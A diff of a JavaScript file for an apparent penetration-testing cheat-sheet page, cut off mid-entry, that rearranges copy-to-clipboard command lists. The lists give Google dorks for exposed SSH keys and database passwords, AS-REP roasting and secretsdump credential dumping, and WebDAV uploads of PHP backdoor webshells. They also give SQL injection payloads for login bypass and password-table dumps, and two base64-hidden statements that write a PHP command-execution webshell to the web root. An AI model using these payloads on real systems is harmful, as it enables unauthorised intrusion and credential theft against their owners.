@@ -3,6 +3,51 @@ $(function () {
   let STORAGE_KEY = null;
   let storageInfo = null;
 
+  // --- Setup OSINT list ---
+  STORAGE_KEY = 'OSINT_ENV';
+  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
+  const osintRhost = (storageInfo && storageInfo.RHOST) || 'example.com';
+  const osint = new Osint('#mytoolOsint', ['#osintDnsList', '#osintGoogleDorksList'], {
+    'RHOST': '#osintInputRHOST',
+    'SUBMIT': '#osintInputSubmit',
+  })
+  osint.STORAGE_KEY = STORAGE_KEY;
+  osint.setup(osintRhost);
+  osint.draw(osintRhost);
+
+  // --- Setup recon list ---
+  STORAGE_KEY = 'RECON_ENV';
+  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
+  const reconRhost = (storageInfo && storageInfo.RHOST) || '10.0.0.1';
+  const reconLport = (storageInfo && storageInfo.RPORT) || '4444';
+  const recon = new Recon('#mytoolRecon', ['#reconNmapList', '#reconLDAPList'], {
+    'RHOST': '#reconInputRHOST',
+    'RPORT': '#reconInputRPORT',
+    'SUBMIT': '#reconInputSubmit',
+  })
+  recon.STORAGE_KEY = STORAGE_KEY;
+  recon.setup(reconRhost, reconLport);
+  recon.draw(reconRhost, reconLport);
+
+  // --- Setup web application penetration test list ---
+  STORAGE_KEY = 'WEB_ENV';
+  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
+  const webURL = (storageInfo && storageInfo.URL) || 'http://10.0.0.1';
+  const webFilename = (storageInfo && storageInfo.FILENAME) || 'webshell';
+  const web = new Web('#mytoolWeb', ['#webList', '#webShellList'], {
+    'URL': '#webInputURL',
+    'FILENAME': '#webInputFILENAME',
+    'SUBMIT': '#webInputSubmit',
+  })
+  web.STORAGE_KEY = STORAGE_KEY;
+  web.setup(webURL, webFilename);
+  web.draw(webURL, webFilename);
+
+  // --- Setup SQL Injection list ---
+  const sqlinj = new SqlInj('#mytoolSqlInj', ['#sqlinjList'], {})
+  sqlinj.setup();
+  sqlinj.draw();
+
   // --- Setup reverse shell list ---
   STORAGE_KEY = 'REVSHELL_ENV';
   storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
@@ -33,34 +78,6 @@ $(function () {
   upDown.setup(updownlhost, updownlport, updownfilename);
   upDown.draw(updownlhost, updownlport, updownfilename);
 
-  // --- Setup recon list ---
-  STORAGE_KEY = 'RECON_ENV';
-  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
-  const reconRhost = (storageInfo && storageInfo.RHOST) || '10.0.0.1';
-  const reconLport = (storageInfo && storageInfo.RPORT) || '4444';
-  const recon = new Recon('#mytoolRecon', ['#reconNmapList', '#reconLDAPList'], {
-    'RHOST': '#reconInputRHOST',
-    'RPORT': '#reconInputRPORT',
-    'SUBMIT': '#reconInputSubmit',
-  })
-  recon.STORAGE_KEY = STORAGE_KEY;
-  recon.setup(reconRhost, reconLport);
-  recon.draw(reconRhost, reconLport);
-
-  // --- Setup web application penetration test list ---
-  STORAGE_KEY = 'WEB_ENV';
-  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
-  const webURL = (storageInfo && storageInfo.URL) || 'http://10.0.0.1';
-  const webFilename = (storageInfo && storageInfo.FILENAME) || 'webshell';
-  const web = new Web('#mytoolWeb', ['#webList', '#webShellList'], {
-    'URL': '#webInputURL',
-    'FILENAME': '#webInputFILENAME',
-    'SUBMIT': '#webInputSubmit',
-  })
-  web.STORAGE_KEY = STORAGE_KEY;
-  web.setup(webURL, webFilename);
-  web.draw(webURL, webFilename);
-
   // --- Setup password cracking list ---
   STORAGE_KEY = 'PASSCRACKING_ENV';
   storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
@@ -72,18 +89,6 @@ $(function () {
   passcrack.STORAGE_KEY = STORAGE_KEY;
   passcrack.setup(passcrackFilename);
   passcrack.draw(passcrackFilename);
-
-  // --- Setup OSINT list ---
-  STORAGE_KEY = 'OSINT_ENV';
-  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
-  const osintRhost = (storageInfo && storageInfo.RHOST) || 'example.com';
-  const osint = new Osint('#mytoolOsint', ['#osintDnsList', '#osintGoogleDorksList'], {
-    'RHOST': '#osintInputRHOST',
-    'SUBMIT': '#osintInputSubmit',
-  })
-  osint.STORAGE_KEY = STORAGE_KEY;
-  osint.setup(osintRhost);
-  osint.draw(osintRhost);
 
   // --- Setup privilege escalation list ---
   STORAGE_KEY = 'PRIVESC_ENV';
@@ -99,10 +104,6 @@ $(function () {
   privesc.setup(privescLhost, privescLport);
   privesc.draw(privescLhost, privescLport);
 
-  // --- Setup SQL Injection list ---
-  const sqlinj = new SqlInj('#mytoolSqlInj', ['#sqlinjList'], {})
-  sqlinj.setup();
-  sqlinj.draw();
 
   // URLのハッシュ(#以降の文字列)で初期表示ページの切り替え
   const myTabButton = document.querySelector(`#myTab button[data-bs-target="${location.hash}"]`);
@@ -119,12 +120,10 @@ class MyTool {
     this.topCSSSelector     = topCSSSelector;     // TOPのCSSセレクタ(ID)
     this.targetCSSSelectors = targetCSSSelectors; // リストのCSSセレクタの一覧
     this.inputCSSSelectors  = inputCSSSelectors;  // 入力フォームのCSSセレクタの一覧
-
     this.targetContents = {}; // コピー項目一覧
   }
 
   setup(...args) {
-
     const submit = () => {
       // 入力項目をinfoに格納する
       const info = {}
@@ -187,7 +186,6 @@ class MyTool {
         });
       }
     }
-
   }
 
   draw(...args) {
@@ -244,6 +242,222 @@ class MyTool {
           }).bind(this), 1500);
         });
     });
+  }
+}
+
+// ---- OSINT ------------------------------------------------------------------
+class Osint extends MyTool {
+  constructor(...args) {
+    super(...args);
+
+    this.targetContents['1.DNS'] = [
+      {'title': 'nslookup - SPF', 'cmd': 'nslookup -type=SPF {0}'},
+      {'title': 'nslookup - DMARC', 'cmd': 'nslookup -type=txt _dmarc.{0}'},
+      {'title': 'dig - A (IP Version 4 Address records)', 'cmd': 'dig A {0}'},
+      {'title': 'dig - AAAA (IP Version 6 Address records)', 'cmd': 'dig AAAA {0}'},
+      {'title': 'dig - CNAME (Canonical Name records)', 'cmd': 'dig CNAME {0}'},
+      {'title': 'dig - HINFO (Host Information records)', 'cmd': 'dig HINFO {0}'},
+      {'title': 'dig - ISDN (Integrated Services Digital Network records)', 'cmd': 'dig ISDN {0}'},
+      {'title': 'dig - MX (Mail exchanger record)', 'cmd': 'dig MX {0}'},
+      {'title': 'dig - NS (Name Server records)', 'cmd': 'dig NS {0}'},
+      {'title': 'dig - PTR (Reverse-lookup Pointer records)', 'cmd': 'dig PTR {0}'},
+      {'title': 'dig - SOA (Start of Authority records)', 'cmd': 'dig SOA {0}'},
+      {'title': 'dig - TXT (Text records)', 'cmd': 'dig TXT {0}'},
+      {'title': 'Zone Transfer', 'cmd': 'dig axfr HOSTNAME @IPADDR'},
+    ];
+
+    this.targetContents['2.GoogleDorks'] = [
+      {'title': 'Log files', 'cmd': '{0} allintext:username filetype:log'},
+      {'title': 'Vulnerable web servers', 'cmd': '{0} inurl:/proc/self/cwd'},
+      {'title': 'Open FTP servers', 'cmd': '{0} intitle:"index of" inurl:ftp'},
+      {'title': 'ENV files', 'cmd': '{0} filetype:env "DB_PASSWORD"'},
+      {'title': 'SSH private keys', 'cmd': '{0} intitle:index.of id_rsa -id_rsa.pub'},
+      {'title': 'SSH private keys', 'cmd': '{0} filetype:log username putty'},
+      {'title': 'Email lists', 'cmd': '{0} filetype:xls inurl:"email.xls"'},
+      {'title': 'Live cameras', 'cmd': '{0} intitle:"webcamXP 5"'},
+      {'title': 'MP3, Movie, and PDF files', 'cmd': '{0} intitle: index of mp3'},
+      {'title': 'MP3, Movie, and PDF files', 'cmd': '{0} intitle: index of pdf'},
+      {'title': 'MP3, Movie, and PDF files', 'cmd': '{0} intext: .mp4'},
+      {'title': 'Weather', 'cmd': '{0} intitle:"Weather Wing WS-2"'},
+      {'title': 'Zoom videos', 'cmd': '{0} inurl:zoom.us/j and intext:scheduled for'},
+      {'title': 'SQL dumps', 'cmd': '{0} "index of" "database.sql.zip"'},
+      {'title': 'WordPress Admin', 'cmd': '{0} intitle:"Index of" wp-admin'},
+      {'title': 'Apache2', 'cmd': '{0} intitle:"Apache2 Ubuntu Default Page: It works"'},
+      {'title': 'phpMyAdmin', 'cmd': '{0} "Index of" inurl:phpmyadmin'},
+      {'title': 'JIRA/Kibana', 'cmd': '{0} inurl:Dashboard.jspa intext:"Atlassian Jira Project Management Software"'},
+      {'title': 'JIRA/Kibana', 'cmd': '{0} inurl:app/kibana intext:Loading Kibana'},
+      {'title': 'cPanel password reset', 'cmd': '{0} inurl:_cpanel/forgotpwd'},
+      {'title': 'Government documents', 'cmd': '{0} allintitle: restricted filetype:doc site:gov'},
+    ];
+  }
+
+  drawList(index, targetContent, rhost) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = content.cmd;
+      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(rhost)}</span>`);
+      // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
+    }
+  }
+}
+
+// ---- Reconnaissance ----------------------------------------------------------
+class Recon extends MyTool {
+  constructor(...args) {
+    super(...args);
+
+    this.targetContents['1.nmap'] = [
+      {'title': 'nmap', 'cmd': 'nmap -T4 -A -v {0}'},
+      {'title': 'nmap', 'cmd': 'nmap -sC -sV -O -n -o nmapscan.txt {0}'},
+      {'title': 'nmap', 'cmd': 'nmap -sC -sV -p{1} "{0}" -o nmapscan.txt'},
+      {'title': 'vuln', 'cmd': 'nmap -Pn --script vuln {0}'},
+    ];
+
+    this.targetContents['LDAP'] = [
+      {'title': 'nmap', 'cmd': 'nmap --script=ldap-search {0}'},
+      {'title': 'enum4linux', 'cmd': 'enum4linux {0}'},
+      {'title': 'enum4linux (extracting users)', 'cmd': `enum4linux {0} | grep -E '^user:' | cut -d "[" -f 2 | cut -d "]" -f 1 > users.txt`},
+      {'title': 'impacket (ASREPRoast Attack)', 'cmd': 'python3 GetNPUsers.py $DOMAIN/ -usersfile "users.txt" -format john -outputfile "GetNPUsers.result"'},
+      {'title': 'impacket secretsdump', 'cmd': 'python3 secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@{0}'},
+    ]
+  }
+
+  drawList(index, targetContent, rhost, rport) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = content.cmd;
+      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(rhost)}</span>`);
+      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(rport)}</span>`);
+      // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
+    }
+  }
+}
+
+// ---- Web Application Penetration Test ---------------------------------------
+class Web extends MyTool {
+  constructor(...args) {
+    super(...args);
+
+    this.targetContents['1.WAPT'] = [
+      {'title': 'Check Header', 'cmd': 'curl -v "{0}'},
+      {'title': 'gobuster', 'cmd': 'gobuster dir -w /usr/share/wordlists/dirb/common.txt -u "{0}"'},
+      {'title': 'nikto', 'cmd': 'nikto --url "{0}"'},
+      {'title': 'WebDAV', 'cmd': 'curl -v -X OPTIONS "{0}"'},
+      {'title': 'WebDAV', 'cmd': 'davtest -url "{0}"'},
+      {'title': 'WebDAV', 'cmd': `curl -v -X PUT '{0}/{1}.php' -d @{1}.php`},
+      {'title': '1. PUT txt file', 'cmd': `curl -v -X PUT '{0}/{1}.txt' --data-binary @{1}.php`},
+      {'title': '2. MOVE from txt to php', 'cmd': `curl -v -X MOVE '{0}/{1}.txt' --header 'Destination: {0}/{1}.php'`},
+      {'title': 'Wordpress', 'cmd': 'wpscan --disable-tls-checks --url "{0}'},
+      {'title': '1. CMSmap', 'cmd': 'git clone https://github.com/Dionach/CMSmap && cd CMSmap && pip3 install .'},
+      {'title': '2. CMSmap', 'cmd': 'cmsmap "{0}"'},
+    ];
+
+    this.targetContents['2.WebShell'] = [
+      {'title': 'JSP', 'cmd': 'cp /usr/share/webshells/jsp/cmdjsp.jsp cmd.jsp'},
+      {'title': 'ASP', 'cmd': 'cp /usr/share/webshells/asp/cmdasp.asp cmd.asp'},
+      {'title': 'ASP', 'cmd': 'cp /usr/share/webshells/asp/cmd-asp-5.1.asp cmd.asp'},
+      {'title': 'ASPX', 'cmd': 'cp /usr/share/webshells/aspx/cmdasp.aspx cmd.aspx'},
+      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/simple-backdoor.php cmd.php'},
+      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/qsd-php-backdoor.php cmd.php'},
+      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/php-backdoor.php cmd.php'},
+      {'title': 'Perl (CGI)', 'cmd': 'cp /usr/share/webshells/perl/perlcmd.cgi cmd.cgi'},
+    ];
+  }
+
+  drawList(index, targetContent, url, filename) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = "";
+      if (content.base64) {
+        cmd = atob(content.base64);
+      } else {
+        cmd = content.cmd;
+      }
+      cmd = cmd.replaceAll('{0}', `<span class="bg-warning">${htmlEscape(url)}</span>`);
+      cmd = cmd.replaceAll('{1}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
+      // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
+    }
+  }
+}
+
+// ---- SQL Injection ---------------------------------------------------
+class SqlInj extends MyTool {
+  constructor(...args) {
+    super(...args);
+
+    this.targetContents['1'] = [
+      {'title': '1. sql - auth bypass', 'cmd': `' or 'x'='x`},
+      {'title': '1. sql - auth bypass', 'cmd': `') or ('x')=('x`},
+      {'title': '1. sql - auth bypass', 'cmd': `')) or (('x'))=(('x`},
+      {'title': '1. sql - auth bypass', 'cmd': `1 or 1=1-- `},
+      {'title': '1. sql - auth bypass', 'cmd': `' or 1=1-- `},
+      {'title': '1. sql - auth bypass', 'cmd': `') or 1=1-- `},
+      {'title': '1. sql - auth bypass', 'cmd': `1/**/or/**/1=1/**/--`},
+      {'title': '2. sql - determine table columns count', 'cmd': `') order by 1 -- `},
+      {'title': '2. sql - determine table columns count', 'cmd': `') order by 2 -- `},
+      {'title': '2. sql - determine table columns count', 'cmd': `') order by 3 -- `},
+      {'title': '2. sql - determine table columns count', 'cmd': `') order by 4 -- `},
+      {'title': '2. sql - determine table columns count', 'cmd': `') order by 5 -- `},
+      {'title': '3. sql - SQLite > Tables', 'cmd': `ZZZ')) UnIoN SeLeCt 1,2,group_concat(tbl_name),null,null from sqlite_master where type='table' --`},
+      {'title': '3. sql - SQLite > Table Columns', 'cmd': `ZZZ')) UnIoN SeLeCt 1,2,sql,null,null from sqlite_master where type='table' and tbl_name='Users' --`},
+      {'title': '3. sql - SQLite > Table dump', 'cmd': `ZZZ')) union select username,email,password,null,null from Users --`},
+      {'title': 'sql', 'cmd': ``},
+      {'title': '9. sql', 'base64': 'U0VMRUNUICZxdW90OyZsdDsmcXVlc3Q7cGhwIHN5c3RlbSZscGFyOyZkb2xsYXI7Jmxvd2JhcjtHRVQmbHNxYjsmYXBvcztxJmFwb3M7JnJzcWI7JnJwYXI7JnNlbWk7ICZxdWVzdDsmZ3Q7JnF1b3Q7IGludG8gb3V0ZmlsZSAmcXVvdDsmc29sO3ZhciZzb2w7d3d3JnNvbDtodG1sJnNvbDtzaGVsbCZwZXJpb2Q7cGhwJnF1b3Q7'},
+      {'title': '9. sql', 'base64': 'c2VsZWN0ICZxdW90OyZsdDsmcXVlc3Q7cGhwIHN5c3RlbSZscGFyOyZkb2xsYXI7Jmxvd2JhcjtHRVQmbHNxYjsmYXBvcztxJmFwb3M7JnJzcWI7JnJwYXI7JnNlbWk7ICZxdWVzdDsmZ3Q7JnF1b3Q7IGludG8gb3V0ZmlsZSAmcXVvdDtDJmNvbG9uOyZic29sOyZic29sO3hhbXBwJmJzb2w7JmJzb2w7aHRkb2NzJmJzb2w7JmJzb2w7Y21kJnBlcmlvZDtwaHAmcXVvdDs='},
+      {'title': 'sql', 'cmd': ``},
+    ];
+  }
+
+  drawList(index, targetContent) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = content.cmd;
+      if (content.base64) {
+        // base64デコードする
+        cmd = atob(content.base64);
+      }
+      // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
+    }
   }
 }
 
@@ -401,105 +615,6 @@ class UpDown extends MyTool {
   }
 }
 
-// ---- Reconnaissance ----------------------------------------------------------
-class Recon extends MyTool {
-  constructor(...args) {
-    super(...args);
-
-    this.targetContents['1.nmap'] = [
-      {'title': 'nmap', 'cmd': 'nmap -T4 -A -v {0}'},
-      {'title': 'nmap', 'cmd': 'nmap -sC -sV -O -n -o nmapscan.txt {0}'},
-      {'title': 'nmap', 'cmd': 'nmap -sC -sV -p{1} "{0}" -o nmapscan.txt'},
-      {'title': 'vuln', 'cmd': 'nmap -Pn --script vuln {0}'},
-    ];
-
-    this.targetContents['LDAP'] = [
-      {'title': 'nmap', 'cmd': 'nmap --script=ldap-search {0}'},
-      {'title': 'enum4linux', 'cmd': 'enum4linux {0}'},
-      {'title': 'enum4linux (extracting users)', 'cmd': `enum4linux {0} | grep -E '^user:' | cut -d "[" -f 2 | cut -d "]" -f 1 > users.txt`},
-      {'title': 'impacket (ASREPRoast Attack)', 'cmd': 'python3 GetNPUsers.py $DOMAIN/ -usersfile "users.txt" -format john -outputfile "GetNPUsers.result"'},
-      {'title': 'impacket secretsdump', 'cmd': 'python3 secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@{0}'},
-    ]
-  }
-
-  drawList(index, targetContent, rhost, rport) {
-    for (let i = 0; i < targetContent.length; i++) {
-      const content = targetContent[i];
-      let title = content.title;
-      let cmd = content.cmd;
-      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(rhost)}</span>`);
-      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(rport)}</span>`);
-      // Template
-      $(this.targetCSSSelectors[index]).append(`
-      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
-        <div class="ms-2 me-auto" style="width: 80%">
-          <div class="fw-bold">${title}</div>
-          <code class="copy_target">${cmd}</code>
-        </div>
-        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
-      </li>
-      `);
-    }
-  }
-}
-
-// ---- Web Application Penetration Test ---------------------------------------
-class Web extends MyTool {
-  constructor(...args) {
-    super(...args);
-
-    this.targetContents['1.WAPT'] = [
-      {'title': 'Check Header', 'cmd': 'curl -v "{0}'},
-      {'title': 'gobuster', 'cmd': 'gobuster dir -w /usr/share/wordlists/dirb/common.txt -u "{0}"'},
-      {'title': 'nikto', 'cmd': 'nikto --url "{0}"'},
-      {'title': 'WebDAV', 'cmd': 'curl -v -X OPTIONS "{0}"'},
-      {'title': 'WebDAV', 'cmd': 'davtest -url "{0}"'},
-      {'title': 'WebDAV', 'cmd': `curl -v -X PUT '{0}/{1}.php' -d @{1}.php`},
-      {'title': '1. PUT txt file', 'cmd': `curl -v -X PUT '{0}/{1}.txt' --data-binary @{1}.php`},
-      {'title': '2. MOVE from txt to php', 'cmd': `curl -v -X MOVE '{0}/{1}.txt' --header 'Destination: {0}/{1}.php'`},
-      {'title': 'Wordpress', 'cmd': 'wpscan --disable-tls-checks --url "{0}'},
-      {'title': '1. CMSmap', 'cmd': 'git clone https://github.com/Dionach/CMSmap && cd CMSmap && pip3 install .'},
-      {'title': '2. CMSmap', 'cmd': 'cmsmap "{0}"'},
-    ];
-
-    this.targetContents['2.WebShell'] = [
-      {'title': 'JSP', 'cmd': 'cp /usr/share/webshells/jsp/cmdjsp.jsp cmd.jsp'},
-      {'title': 'ASP', 'cmd': 'cp /usr/share/webshells/asp/cmdasp.asp cmd.asp'},
-      {'title': 'ASP', 'cmd': 'cp /usr/share/webshells/asp/cmd-asp-5.1.asp cmd.asp'},
-      {'title': 'ASPX', 'cmd': 'cp /usr/share/webshells/aspx/cmdasp.aspx cmd.aspx'},
-      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/simple-backdoor.php cmd.php'},
-      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/qsd-php-backdoor.php cmd.php'},
-      {'title': 'PHP', 'cmd': 'cp /usr/share/webshells/php/php-backdoor.php cmd.php'},
-      {'title': 'Perl (CGI)', 'cmd': 'cp /usr/share/webshells/perl/perlcmd.cgi cmd.cgi'},
-    ];
-  }
-
-  drawList(index, targetContent, url, filename) {
-    for (let i = 0; i < targetContent.length; i++) {
-      const content = targetContent[i];
-      let title = content.title;
-      let cmd = "";
-      if (content.base64) {
-        cmd = atob(content.base64);
-      } else {
-        cmd = content.cmd;
-      }
-      cmd = cmd.replaceAll('{0}', `<span class="bg-warning">${htmlEscape(url)}</span>`);
-      cmd = cmd.replaceAll('{1}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
-      // Template
-      $(this.targetCSSSelectors[index]).append(`
-      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
-        <div class="ms-2 me-auto" style="width: 80%">
-          <div class="fw-bold">${title}</div>
-          <code class="copy_target">${cmd}</code>
-        </div>
-        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
-      </li>
-      `);
-    }
-  }
-}
-
 // ---- Password Cracking ------------------------------------------------------
 class PassCrack extends MyTool {
   constructor(...args) {
@@ -533,72 +648,6 @@ class PassCrack extends MyTool {
           <div class="fw-bold">${title}</div>
           <code class="copy_target">${cmd}</code>
           ${(memo === "") ? "": `<p class="ms-3 mt-2">${memo}</p>`}
-        </div>
-        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
-      </li>
-      `);
-    }
-  }
-}
-
-// ---- OSINT ------------------------------------------------------------------
-class Osint extends MyTool {
-  constructor(...args) {
-    super(...args);
-
-    this.targetContents['1.DNS'] = [
-      {'title': 'nslookup - SPF', 'cmd': 'nslookup -type=SPF {0}'},
-      {'title': 'nslookup - DMARC', 'cmd': 'nslookup -type=txt _dmarc.{0}'},
-      {'title': 'dig - A (IP Version 4 Address records)', 'cmd': 'dig A {0}'},
-      {'title': 'dig - AAAA (IP Version 6 Address records)', 'cmd': 'dig AAAA {0}'},
-      {'title': 'dig - CNAME (Canonical Name records)', 'cmd': 'dig CNAME {0}'},
-      {'title': 'dig - HINFO (Host Information records)', 'cmd': 'dig HINFO {0}'},
-      {'title': 'dig - ISDN (Integrated Services Digital Network records)', 'cmd': 'dig ISDN {0}'},
-      {'title': 'dig - MX (Mail exchanger record)', 'cmd': 'dig MX {0}'},
-      {'title': 'dig - NS (Name Server records)', 'cmd': 'dig NS {0}'},
-      {'title': 'dig - PTR (Reverse-lookup Pointer records)', 'cmd': 'dig PTR {0}'},
-      {'title': 'dig - SOA (Start of Authority records)', 'cmd': 'dig SOA {0}'},
-      {'title': 'dig - TXT (Text records)', 'cmd': 'dig TXT {0}'},
-      {'title': 'Zone Transfer', 'cmd': 'dig axfr HOSTNAME @IPADDR'},
-    ];
-
-    this.targetContents['2.GoogleDorks'] = [
-      {'title': 'Log files', 'cmd': '{0} allintext:username filetype:log'},
-      {'title': 'Vulnerable web servers', 'cmd': '{0} inurl:/proc/self/cwd'},
-      {'title': 'Open FTP servers', 'cmd': '{0} intitle:"index of" inurl:ftp'},
-      {'title': 'ENV files', 'cmd': '{0} filetype:env "DB_PASSWORD"'},
-      {'title': 'SSH private keys', 'cmd': '{0} intitle:index.of id_rsa -id_rsa.pub'},
-      {'title': 'SSH private keys', 'cmd': '{0} filetype:log username putty'},
-      {'title': 'Email lists', 'cmd': '{0} filetype:xls inurl:"email.xls"'},
-      {'title': 'Live cameras', 'cmd': '{0} intitle:"webcamXP 5"'},
-      {'title': 'MP3, Movie, and PDF files', 'cmd': '{0} intitle: index of mp3'},
-      {'title': 'MP3, Movie, and PDF files', 'cmd': '{0} intitle: index of pdf'},
-      {'title': 'MP3, Movie, and PDF files', 'cmd': '{0} intext: .mp4'},
-      {'title': 'Weather', 'cmd': '{0} intitle:"Weather Wing WS-2"'},
-      {'title': 'Zoom videos', 'cmd': '{0} inurl:zoom.us/j and intext:scheduled for'},
-      {'title': 'SQL dumps', 'cmd': '{0} "index of" "database.sql.zip"'},
-      {'title': 'WordPress Admin', 'cmd': '{0} intitle:"Index of" wp-admin'},
-      {'title': 'Apache2', 'cmd': '{0} intitle:"Apache2 Ubuntu Default Page: It works"'},
-      {'title': 'phpMyAdmin', 'cmd': '{0} "Index of" inurl:phpmyadmin'},
-      {'title': 'JIRA/Kibana', 'cmd': '{0} inurl:Dashboard.jspa intext:"Atlassian Jira Project Management Software"'},
-      {'title': 'JIRA/Kibana', 'cmd': '{0} inurl:app/kibana intext:Loading Kibana'},
-      {'title': 'cPanel password reset', 'cmd': '{0} inurl:_cpanel/forgotpwd'},
-      {'title': 'Government documents', 'cmd': '{0} allintitle: restricted filetype:doc site:gov'},
-    ];
-  }
-
-  drawList(index, targetContent, rhost) {
-    for (let i = 0; i < targetContent.length; i++) {
-      const content = targetContent[i];
-      let title = content.title;
-      let cmd = content.cmd;
-      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(rhost)}</span>`);
-      // Template
-      $(this.targetCSSSelectors[index]).append(`
-      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
-        <div class="ms-2 me-auto" style="width: 80%">
-          <div class="fw-bold">${title}</div>
-          <code class="copy_target">${cmd}</code>
         </div>
         <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
       </li>
@@ -670,57 +719,6 @@ class PrivEsc extends MyTool {
           <div class="fw-bold">${title}</div>
           <code class="copy_target">${cmd}</code>
           ${(memo === "") ? "": `<p class="ms-3 mt-2">${memo}</p>`}
-        </div>
-        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
-      </li>
-      `);
-    }
-  }
-}
-
-// ---- SQL Injection ---------------------------------------------------
-class SqlInj extends MyTool {
-  constructor(...args) {
-    super(...args);
-
-    this.targetContents['1'] = [
-      {'title': '1. sql - auth bypass', 'cmd': `' or 'x'='x`},
-      {'title': '1. sql - auth bypass', 'cmd': `') or ('x')=('x`},
-      {'title': '1. sql - auth bypass', 'cmd': `')) or (('x'))=(('x`},
-      {'title': '1. sql - auth bypass', 'cmd': `1 or 1=1-- `},
-      {'title': '1. sql - auth bypass', 'cmd': `' or 1=1-- `},
-      {'title': '1. sql - auth bypass', 'cmd': `') or 1=1-- `},
-      {'title': '1. sql - auth bypass', 'cmd': `1/**/or/**/1=1/**/--`},
-      {'title': '2. sql - table columns number', 'cmd': `') order by 1 -- `},
-      {'title': '2. sql - determine table columns count', 'cmd': `') order by 2 -- `},
-      {'title': '2. sql - determine table columns count', 'cmd': `') order by 3 -- `},
-      {'title': '2. sql - determine table columns count', 'cmd': `') order by 4 -- `},
-      {'title': '2. sql - determine table columns count', 'cmd': `') order by 5 -- `},
-      {'title': '3. sql - SQLite > Tables', 'cmd': `ZZZ')) UnIoN SeLeCt 1,2,group_concat(tbl_name),null,null from sqlite_master where type='table' --`},
-      {'title': '3. sql - SQLite > Table Columns', 'cmd': `ZZZ')) UnIoN SeLeCt 1,2,sql,null,null from sqlite_master where type='table' and tbl_name='Users' --`},
-      {'title': '3. sql - SQLite > Table dump', 'cmd': `ZZZ')) union select username,email,password,null,null from Users --`},
-      {'title': 'sql', 'cmd': ``},
-      {'title': '9. sql', 'base64': 'U0VMRUNUICZxdW90OyZsdDsmcXVlc3Q7cGhwIHN5c3RlbSZscGFyOyZkb2xsYXI7Jmxvd2JhcjtHRVQmbHNxYjsmYXBvcztxJmFwb3M7JnJzcWI7JnJwYXI7JnNlbWk7ICZxdWVzdDsmZ3Q7JnF1b3Q7IGludG8gb3V0ZmlsZSAmcXVvdDsmc29sO3ZhciZzb2w7d3d3JnNvbDtodG1sJnNvbDtzaGVsbCZwZXJpb2Q7cGhwJnF1b3Q7'},
